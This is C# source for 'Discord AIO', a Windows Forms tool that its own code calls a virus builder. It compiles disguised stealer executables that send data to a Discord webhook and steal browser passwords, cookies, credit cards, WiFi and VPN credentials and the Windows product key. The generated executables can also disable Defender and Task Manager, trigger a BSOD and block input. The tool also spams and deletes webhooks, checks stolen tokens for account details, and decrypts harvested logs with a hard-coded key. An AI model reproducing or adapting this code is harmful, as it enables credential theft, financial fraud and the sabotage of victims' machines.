﻿using DiscordRPC;
using Leaf.xNet;
using ScintillaNET;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media.Imaging;

// Made by Nyxon
// Featuring yunglean_ and dv0l

namespace discordAIO
{
    public partial class main : Form
    {

        private string version = "v0.3";
        private protected string email = "fmediolanek@gmail.com";
        private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";

        public DiscordRpcClient client;

        public main()
        {
            InitializeComponent();
            mainPage.Visible = true;
            webhooksPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;
            daioPage.Visible = false;
            credentialsPage.Visible = false;
            ssPage.Visible = false;

            label46.Text = version;

            // Utils
            this._randomChars = new RandomCharacters();
            this.randomFileInfo_0 = new RandomInfo(this.randomCharacters_0);

            CheckProtection();
            Scintilla();
            DiscordRPC();
        }

        private void CheckProtection()
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");

            WebClient userIP = new WebClient();
            string resposne = userIP.DownloadString("http://check.getipintel.net/check.php?ip=" + ip + "&contact=" + email + "&flags=m");

            int responseNum = Int32.Parse(resposne);

            if (responseNum < 1)
            {
                label2.Text = ip + " > unprotected";
            } 
            else if (responseNum == -5) {
                MessageBox.Show("Error.\nContact email incorrect or blocked.", "Discord AIO");
            }
            else if (responseNum == -6)
            {
                MessageBox.Show("Error.\nContact email incorrect.", "Discord AIO");
            }
            else if (responseNum == -4)
            {
                MessageBox.Show("Error.\nUnable to reach database.\n\nProbably it is being updated.", "Discord AIO");
            }
            else
            {
                label2.Text = ip + " > protected";
            }

        }

        protected void DiscordRPC()
        {
            client = new DiscordRpcClient("811586717433331732");
            client.Initialize();
            client.SetPresence(new RichPresence()
            {
                Details = "Running the best virus builder in the world...",
                State = "github.com/Nyxonn",
                Assets = new Assets()
                {
                    LargeImageKey = "daiorpc2",
                    LargeImageText = "Discord AIO " + version
                }

            });
        }

      void Scintilla()
        {
            scintilla1.Lexer = Lexer.Cpp;
            scintilla1.StyleResetDefault();
            scintilla1.Styles[Style.Default].Font = "Consolas";
            scintilla1.Styles[Style.Default].Size = 10;
            scintilla1.Styles[Style.Default].BackColor = Color.Black;
            scintilla1.Styles[Style.Default].ForeColor = Color.DarkRed;

            scintilla1.StyleClearAll();
            scintilla1.Styles[Style.Cpp.Default].ForeColor = System.Drawing.Color.DarkRed;
            scintilla1.Styles[Style.Cpp.Comment].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            scintilla1.Styles[Style.Cpp.CommentLine].ForeColor = System.Drawing.Color.FromArgb(0, 128, 0);
            scintilla1.Styles[Style.Cpp.CommentLineDoc].ForeColor = System.Drawing.Color.FromArgb(128, 128, 128);
            scintilla1.Styles[Style.Cpp.Number].ForeColor = System.Drawing.Color.Olive;
            scintilla1.Styles[Style.Cpp.Word].ForeColor = System.Drawing.Color.Blue;
            scintilla1.Styles[Style.Cpp.Word2].ForeColor = System.Drawing.Color.Blue;
            scintilla1.Styles[Style.Cpp.String].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.Character].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.Verbatim].ForeColor = System.Drawing.Color.FromArgb(163, 21, 21);
            scintilla1.Styles[Style.Cpp.StringEol].BackColor = System.Drawing.Color.Pink;
            scintilla1.Styles[Style.Cpp.Operator].ForeColor = System.Drawing.Color.Purple;
            scintilla1.Styles[Style.Cpp.Preprocessor].ForeColor = System.Drawing.Color.Maroon;
            scintilla1.Margins[0].Width = 16;
            scintilla1.Styles[Style.LineNumber].BackColor = Color.FromArgb(10, 10, 10);
            scintilla1.ScrollWidth = 1;

        }

        private void Solid_Paint(object sender, PaintEventArgs e)
        {
            Panel panel = (Panel)sender;
            float width = (float)1.0;
            Color color = Color.DarkRed;
            Pen pen = new Pen(color, width);
            pen.DashStyle = DashStyle.Solid;
            e.Graphics.DrawLine(pen, 0, 0, 0, panel.Height - 0);
            e.Graphics.DrawLine(pen, 0, 0, panel.Width - 0, 0);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, 0, panel.Height - 1);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, panel.Width - 1, 0);
        }


        private void Dot_Paint(object sender, PaintEventArgs e)
        {
            Panel panel = (Panel)sender;
            float width = (float)1.0;
            Color color = Color.DarkRed;
            Pen pen = new Pen(color, width);
            pen.DashStyle = DashStyle.Dash;
            e.Graphics.DrawLine(pen, 0, 0, 0, panel.Height - 0);
            e.Graphics.DrawLine(pen, 0, 0, panel.Width - 0, 0);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, 0, panel.Height - 1);
            e.Graphics.DrawLine(pen, panel.Width - 1, panel.Height - 1, panel.Width - 1, 0);
        }

        private void button1_Click(object sender, EventArgs e) // Main button
        {
            webhooksPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;
            daioPage.Visible = false;
            mainPage.Visible = true;
            credentialsPage.Visible = false;
            ssPage.Visible = false;
        }

        private void button4_Click(object sender, EventArgs e) // Webhooks button
        {
            webhooksPage.Visible = true;
            mainPage.Visible = false;
            tokensPage.Visible = false;
            builderPage.Visible = false;
            daioPage.Visible = false;
            credentialsPage.Visible = false;
            ssPage.Visible = false;
        }






        // Encryption / Decryption

        private const int Keysize = 256;
        private const int DerivationIterations = 1000;

        public static string Decrypt(string cipherText)
        {
            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                var plainTextBytes = new byte[cipherTextBytes.Length];
                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }

        public static string Encrypt(string plainText)
        {
            var saltStringBytes = Generate256BitsOfRandomEntropy();
            var ivStringBytes = Generate256BitsOfRandomEntropy();
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            using (var password = new Rfc2898DeriveBytes(dAIOPass, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                            {
                                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                                cryptoStream.FlushFinalBlock();
                                var cipherTextBytes = saltStringBytes;
                                cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
                                cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Convert.ToBase64String(cipherTextBytes);
                            }
                        }
                    }
                }
            }
        }

        private static byte[] Generate256BitsOfRandomEntropy()
        {
            var randomBytes = new byte[32];
            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(randomBytes);
            }
            return randomBytes;
        }

        private void button7_Click(object sender, EventArgs e) // Perform Webhook Check MAIN
        {
            if (String.IsNullOrEmpty(textBox2.Text) || String.IsNullOrWhiteSpace(textBox2.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(textBox2.Text);
                    MessageBox.Show("Webhook valid.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }

        private void label4_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/qjrDprutvg");
        }

        private void button6_Click(object sender, EventArgs e) // Perform Webhook Check Webhooks
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                WebClient checkWebhook = new WebClient();
                try
                {
                    string webhook = checkWebhook.DownloadString(textBox1.Text);
                    MessageBox.Show("Webhook valid.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        private bool webhookSwitch = false;
        private bool webHandler = false;

        private void button9_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text) || (String.IsNullOrEmpty(textBox3.Text) || String.IsNullOrWhiteSpace(textBox3.Text) || (String.IsNullOrEmpty(textBox4.Text) || String.IsNullOrWhiteSpace(textBox4.Text))))
            {
                MessageBox.Show("Webhook, name and message cannot be empty!", "Discord AIO");
            }
            else
            {
                string SPAMwebhook = textBox1.Text;
                string SPAMname = textBox3.Text;
                string SPAMmessage = textBox4.Text;

                webhookSwitch = true;


                if (checkBox17.Checked)
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
                                    Thread.Sleep(2000);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
                                    Thread.Sleep(3000);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }
                else
                {
                    new Thread(() =>
                    {
                        while (webhookSwitch)
                        {
                            try
                            {
                                using (HttpRequest req = new HttpRequest())
                                {
                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
                                    Thread.Sleep(35);
                                }
                            }
                            catch
                            {
                                if (webHandler == false)
                                {
                                    webhookSwitch = false;
                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
                                    Thread.Sleep(500);
                                    webhookSwitch = true;
                                }
                            }
                        }
                    }).Start();
                }

            }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            webhookSwitch = false;
            webHandler = true;
            MessageBox.Show("Spam stopped.", "Discord AIO");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
            {
                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
            }
            else
            {
                try
                {
                    new HttpRequest().Delete(textBox1.Text).ToString();
                    MessageBox.Show("Webhook deleted.", "Discord AIO");
                }
                catch
                {
                    MessageBox.Show("Invalid webhook.", "Discord AIO");
                }
            }
        }

        // Get between handler
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }

            return "";
        }

        // Token checker
        private void button11_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
            {
                MessageBox.Show("Token cannot be empty!", "Discord AIO");
            } else
            {
                string token = textBox5.Text;

                try
                {

                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    var tokenReq = req.Get("https://discordapp.com/api/users/@me");
                    string tokenCreds = tokenReq.ToString();

                    string nameData = getBetween(tokenCreds, "username\": ", ",");
                    string nameDISData = getBetween(tokenCreds, "discriminator\": ", ",");
                    string emailData = getBetween(tokenCreds, "email\": ", ",");
                    string phoneData = getBetween(tokenCreds, "phone\": ", "}");
                    string idData = getBetween(tokenCreds, "id\": ", ",");
                    string mfaData = getBetween(tokenCreds, "mfa_enabled\": ", ",");
                    string vData = getBetween(tokenCreds, "verified\": ", ",");
                    string avatarData = getBetween(tokenCreds, "avatar\": ", ",");

                    // Trims
                    label18.Text = nameData.Trim('"') + " #" + nameDISData.Trim('"');
                    label19.Text = emailData.Trim('"');
                    label20.Text = phoneData.Trim('"');
                    string trimedID = idData.Trim('"');
                    string trimedMFA = mfaData.Trim('"');
                    string trimedVRF = vData.Trim('"');
                    string trimedAvatar = avatarData.Trim('"');
                    label21.Text = trimedID;

                    // MFA label
                    string credMFA = "Disabled";
                    if (trimedMFA == "true")
                    {
                        credMFA = "Enabled";
                    }
                    label22.Text = credMFA;

                    // Verified label
                    string credVRF = "Unverified";
                    if (trimedVRF == "true")
                    {
                        credVRF = "Verified";
                    }
                    label23.Text = credVRF;

                    // Avatar
                    string link = "https://cdn.discordapp.com/avatars/" + trimedID + "/" + trimedAvatar + ".jpg";
                    var request = WebRequest.Create(link);

                    using (var response = request.GetResponse())
                    using (var stream = response.GetResponseStream())
                    {
                        pictureBox2.Image = Bitmap.FromStream(stream);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    MessageBox.Show("Invalid token.", "Discord AIO");
                }

            }
        }

        private void button12_Click(object sender, EventArgs e)
        {
            string token = textBox5.Text;
            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
            {
                MessageBox.Show("Token cannot be empty!", "Discord AIO");
            }
            else
            {
                try
                {
                    HttpRequest req = new HttpRequest();
                    req.AddHeader("Authorization", token);
                    req.Post("https://discordapp.com/api/v6/invite/minecraft");
                }
                catch
                {
                    MessageBox.Show("Token deleted.", "Discord AIO");
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            tokensPage.Visible = true;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
            builderPage.Visible = false;
            daioPage.Visible = false;
            credentialsPage.Visible = false;
            ssPage.Visible = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            builderPage.Visible = true;
            tokensPage.Visible = false;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
            daioPage.Visible = false;
            credentialsPage.Visible = false;
            ssPage.Visible = false;
        }

        // Handlers
        private readonly Random _random = new Random();
        private readonly RandomCharacters _randomChars;
        private readonly RandomCharacters randomCharacters_0;
        private readonly RandomInfo randomFileInfo_0;

        private string Title = "N/A";
        private string Description = "N/A";
        private string Product = "N/A";
        private string Company = "N/A";
        private string Copyright = "N/A";
        private string Trademark = "N/A";
        private string MajorVersion = "N/A";
        private string MinorVersion = "N/A";
        private string BuildPart = "N/A";
        private string PrivatePart = "N/A";

        // Builder
        private void builderButton_Click(object sender, EventArgs e)
        {
            if (label24.Text == "None")
            {
                MessageBox.Show("You need to generate or clone file info.", "Discord AIO");
            }
            else
            {
                label26.Text = "Opening explorer...";
                try
                {
                    using (SaveFileDialog saveFileDialog = new SaveFileDialog())
                    {
                        saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                        if (saveFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            label26.Text = "Creating file...";
                            string text = "x";//Properties.Resources.stub;
                            text = text.Replace("DiscordAIO", _randomChars.getRandomCharacters(_random.Next(10, 20)));
                            text = text.Replace("%Title%", Title);
                            text = text.Replace("%Description%", Description);
                            text = text.Replace("%Product%", Product);
                            text = text.Replace("%Company%", Company);
                            text = text.Replace("%Copyright%", Copyright);
                            text = text.Replace("%Trademark%", Trademark);
                            text = text.Replace("%v1%", MajorVersion);
                            text = text.Replace("%v2%", MinorVersion);
                            text = text.Replace("%v3%", BuildPart);
                            text = text.Replace("%v4%", PrivatePart);
                            text = text.Replace("%Guid%", Guid.NewGuid().ToString());
                            text = text.Replace("AIOwebhook", textBox2.Text);
                            label26.Text = "File created. Please wait...";
                            Thread.Sleep(1000);
                            label26.Text = "Creating additional options...";
                            // Add to Startup
                            if (checkBox1.Checked)
                            {
                                text = text.Replace("//startupaio", "Startup();");
                            }
                            // Hide stealer
                            if (checkBox23.Checked)
                            {
                                text.Replace("//hideme", "HideFile();");
                            }
                            // Fake error
                            if (checkBox5.Checked)
                            {
                                text = text.Replace("//errorhere", "Error();");
                                text = text.Replace("titleError", textBox6.Text);
                                text = text.Replace("messageError", textBox7.Text);
                            }
                            // BSOD
                            if (checkBox6.Checked)
                            {
                                text = text.Replace("//bsodlmao", "BSOD();");
                            }
                            // Task Manager
                            if (checkBox3.Checked)
                            {
                                text = text.Replace("//killctrlaltdel", "KillTM();");
                            }
                            // Windows Defender
                            if (checkBox2.Checked)
                            {
                                text = text.Replace("//killdefender", "Defender.KillDefender();");
                            }
                            // Input
                            if (checkBox24.Checked)
                            {
                                text = text.Replace("//killinput", "BlockInput();");
                            }
                            // Websites
                            if (checkBox7.Checked)
                            {
                                text = text.Replace("//killweb", "KillWebsites();");
                            }
                            // Internet
                            if (checkBox4.Checked)
                            {
                                text = text.Replace("//killinternet", "KillWIFI();");
                            }
                            // Desktop picture
                        //    if (bunifuCheckBox9.Checked)
                        //    {
                        //        text = text.Replace("//takepic", "TakePicture();");
                        //    }
                            // Jumpscare
                            if (checkBox8.Checked)
                            {
                                text = text.Replace("//jumpscare", "Jumpscare();");
                            }
                            // Custom plugin
                            if (checkBox16.Checked)
                            {
                                text = text.Replace("//custom", "CustomPlugin();");
                                text = text.Replace("//customcodehere", scintilla1.Text);
                            }
                            // Windows product key
                            if (checkBox9.Checked)
                            {
                                text = text.Replace("//winkey", "WinProductKey();");
                            }



                            // Passwords
                            if (checkBox15.Checked)
                            {
                                text = text.Replace("//stealpasses", "Chrome.RunPass();");
                            }
                            // Cookies
                            if (checkBox14.Checked)
                            {
                                text = text.Replace("//stealcookies", "Chrome.RunCookies();");
                            }
                            // History
                            if (checkBox11.Checked)
                            {
                                text = text.Replace("//stealhistory", "Chrome.RunHis();");
                            }
                            // CC
                            if (checkBox12.Checked)
                            {
                                text = text.Replace("//stealcreditcard", "Chrome.RunCC();");
                            }


                            // WIFI passwords
                            if (checkBox10.Checked)
                            {
                                text = text.Replace("//stealwifi", "StealWIFI();");
                            }
                            // NordVPN
                            if (checkBox13.Checked)
                            {
                                text = text.Replace("//stealnord", "NordVPN.Save();");
                            }




                            label26.Text = "Additional options created. Compiling...";
                            Thread.Sleep(500);
                            if (Compiler.AIOcompilation(text, saveFileDialog.FileName, string.IsNullOrWhiteSpace(label33.Text) ? null : label33.Text))
                            {
                                label26.Text = "Saved as " + saveFileDialog.FileName;
                                MessageBox.Show("Compilation done.", "Discord AIO");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    label26.Text = ex.Message;
                }
            }
        }

        // File info generate button
        private void button14_Click(object sender, EventArgs e)
        {
            FileInfo randomFileInfo = randomFileInfo_0.getRandomFileInfo();
            Title = randomFileInfo.Title;
            Description = randomFileInfo.Description;
            Product = randomFileInfo.Product;
            Company = randomFileInfo.Company;
            Copyright = randomFileInfo.Copyright;
            Trademark = randomFileInfo.Trademark;
            MajorVersion = randomFileInfo.MajorVersion;
            MinorVersion = randomFileInfo.MinorVersion;
            BuildPart = randomFileInfo.BuildPart;
            PrivatePart = randomFileInfo.PrivatePart;

            label24.Text = Description;
        }
        // File info clone button
        private void button15_Click(object sender, EventArgs e)
        {
            try
            {
                string mTitle = "null";
                string mDescription = "null";
                string mProduct = "null";
                string mCompany = "null";
                string mCopyright = "null";
                string mTrademark = "null";
                string mMajorVersion = "null";
                string mMinorVersion = "null";
                string mBuildPart = "null";
                string mPrivatePart = "null";

                OpenFileDialog cloningDialog = new OpenFileDialog();
                cloningDialog.Filter = "Executable (*.exe)|*.exe";

                if (cloningDialog.ShowDialog() == DialogResult.OK)
                {
                    string path = Path.GetFullPath(cloningDialog.FileName);

                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);
                    mTitle = info.OriginalFilename;
                    mDescription = info.FileDescription;
                    mProduct = info.ProductName;
                    mCompany = info.CompanyName;
                    mCopyright = info.LegalCopyright;
                    mTrademark = info.LegalTrademarks;
                    mMajorVersion = info.FileMajorPart.ToString();
                    mMinorVersion = info.FileMinorPart.ToString();
                    mBuildPart = info.FileBuildPart.ToString();
                    mPrivatePart = info.FileBuildPart.ToString();

                }
                if (mDescription == "")
                {
                    label24.Text = mProduct;
                } else
                {
                    label24.Text = mDescription;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        // Program icon
        private void button16_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog icOpen = new OpenFileDialog();
                icOpen.Title = "Select stealer icon";
                icOpen.Filter = "Icon (*.ico)|*.ico";

                if (icOpen.ShowDialog() == DialogResult.OK)
                {
                    pictureBox3.Image = new Bitmap(icOpen.FileName);
                    label33.Text = icOpen.FileName;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        // Color picker
        private void button17_Click(object sender, EventArgs e)
        {
            ColorDialog dlg = new ColorDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                pictureBox4.BackColor = Color.FromArgb(dlg.Color.A, dlg.Color.R, dlg.Color.G, dlg.Color.B);
            }
        }

        // .dAIO
        private void button18_Click(object sender, EventArgs e)
        {
            string ipData = "N/A";
            string nameData = "N/A";
            string tokenData = "N/A";
            string macData = "N/A";
            string link = "N/A";
            string winkeyData = "N/A";
            string passwordsData = "N/A";
            string cookiesData = "N/A";
            string ccData = "N/A";
            string hisData = "N/A";
            string vpnData = "N/A";
            string wpData = "N/A";
            string wnData = "N/A";
            try
            {
                using (OpenFileDialog open = new OpenFileDialog())
                {
                    open.Filter = "dAIO (*.dAIO)|*.dAIO";
                    if (open.ShowDialog() == DialogResult.OK)
                    {
                        string creText = File.ReadAllText(open.FileName);
                        string decryptedText = Decrypt(creText);

                        string directoryPath = Path.GetDirectoryName(open.FileName);
                        textBox8.Text = directoryPath;

                        creText = creText.Replace(creText, decryptedText);
                        File.WriteAllText(open.FileName, creText);

                        ipData = getBetween(decryptedText, "IP Address: ", " |");
                        nameData = getBetween(decryptedText, "Desktop name: ", " |");
                        macData = getBetween(decryptedText, "MAC Address: ", " |");

                        string[] lines = File.ReadAllLines(open.FileName);
                        for (int i = 0; i < lines.Length; i++)
                        {
                            if (lines[i].Contains("# End of Tokens") && i >= 2)
                            {
                                tokenData = lines[i - 2];
                            }
                        }

                        string encryptedText = Encrypt(creText);
                        creText = creText.Replace(creText, encryptedText);
                        File.WriteAllText(open.FileName, creText);

                        if (decryptedText.Contains("# Windows"))
                        {
                            winkeyData = getBetween(decryptedText, "Key: ", " |");
                        }

                        if (decryptedText.Contains("# Passwords"))
                        {
                            passwordsData = getBetween(decryptedText, "# Passwords", "# End of Passwords");
                            listBox1.Items.Clear();

                            foreach (string s in Regex.Split(passwordsData, "\n"))
                                listBox1.Items.Add(s);
                        }
                        else
                        {
                            listBox1.Items.Clear();
                            listBox1.Items.Add(passwordsData);
                        }

                        if (decryptedText.Contains("# Cookies"))
                        {
                            cookiesData = getBetween(decryptedText, "Cookies", "# End of Cookies");
                            listBox2.Items.Clear();

                            foreach (string s in Regex.Split(cookiesData, "\n"))
                                listBox2.Items.Add(s);
                        }
                        else
                        {
                            listBox2.Items.Clear();
                            listBox2.Items.Add(cookiesData);
                        }


                        if (decryptedText.Contains("# Credit Cards"))
                        {
                            ccData = getBetween(decryptedText, "Credit Cards", "# End of Credit Cards");
                            listBox3.Items.Clear();

                            foreach (string s in Regex.Split(ccData, "\n"))
                                listBox3.Items.Add(s);
                        }
                        else
                        {
                            listBox3.Items.Clear();
                            listBox3.Items.Add(ccData);
                        }

                        if (decryptedText.Contains("# History"))
                        {
                            hisData = getBetween(decryptedText, "History", "# End of History");
                            listBox4.Items.Clear();

                            foreach (string s in Regex.Split(hisData, "\n"))
                                listBox4.Items.Add(s);
                        }
                        else
                        {
                            listBox4.Items.Clear();
                            listBox4.Items.Add(hisData);
                        }



                        if (decryptedText.Contains("# NordVPN"))
                        {
                            vpnData = getBetween(decryptedText, "NordVPN", "# End of NordVPN");
                            listBox5.Items.Clear();

                            foreach (string s in Regex.Split(vpnData, "\n"))
                                listBox5.Items.Add(s);
                        }
                        else
                        {
                            listBox5.Items.Clear();
                            listBox5.Items.Add(vpnData);
                        }

                        if (decryptedText.Contains("# Wifi Network"))
                        {
                            wnData = getBetween(decryptedText, "Wifi Network", "# End of Wifi Network");
                            listBox6.Items.Clear();

                            foreach (string s in Regex.Split(wnData, "\n"))
                                listBox6.Items.Add(s);
                        }
                        else
                        {
                            listBox6.Items.Clear();
                            listBox6.Items.Add(wnData);
                        }


                        if (decryptedText.Contains("# Wifi Password") && decryptedText.Contains("# Wifi Network"))
                        {
                            wpData = getBetween(decryptedText, "Wifi Password", "# End of Wifi Password");
                        //    listBox6.Items.Clear();

                            foreach (string s in Regex.Split(wpData, "\n"))
                                listBox6.Items.Add(s);
                        }
                        else
                        {
                            listBox6.Items.Clear();
                            listBox6.Items.Add(wpData);
                        }


                        textBox9.Text = nameData;
                        textBox10.Text = ipData;
                        textBox12.Text = tokenData;
                        textBox11.Text = macData;
                        textBox13.Text = winkeyData;


                        if (decryptedText.Contains("picURL"))
                        {
                            link = getBetween(decryptedText, "picURL: ", " |");

                            var request = WebRequest.Create(link);

                            using (var response = request.GetResponse())
                            using (var stream = response.GetResponseStream())
                            {
                                pictureBox5.Invoke(new Action(delegate ()
                                {
                                    pictureBox5.Image = Bitmap.FromStream(stream);
                                }));
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            builderPage.Visible = false;
            tokensPage.Visible = false;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
            daioPage.Visible = true;
        }

        Image zoomImg;

        // SS
        private void button19_Click(object sender, EventArgs e)
        {
            zoomImg = pictureBox5.Image;
            builderPage.Visible = false;
            tokensPage.Visible = false;
            webhooksPage.Visible = false;
            mainPage.Visible = false;
            daioPage.Visible = false;
            credentialsPage.Visible = false;
            ssPage.Visible = true;
        }

        // Image resizer
        Image Zoom(Image img, Size size)
        {
            Bitmap bmp = new Bitmap(img, img.Width + (img.Width * size.Width / 100), img.Height + (img.Height * size.Height / 100));
            Graphics g = Graphics.FromImage(bmp);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
            return bmp;
        }
        private void hScrollBar1_Scroll(object sender, ScrollEventArgs e)
        {
            if (pictureBox5 == null || pictureBox5.Image == null)
            {
            } 
            else
            {
                if (hScrollBar1.Value > 0)
                {
                    pictureBox5.Image = Zoom(zoomImg, new Size(hScrollBar1.Value, hScrollBar1.Value));
                }
            }

        }

        private void button20_Click(object sender, EventArgs e)
        {
            builderPage.Visible = false;
            tokensPage.Visible = false;
            webhooksPage.Visible = false;
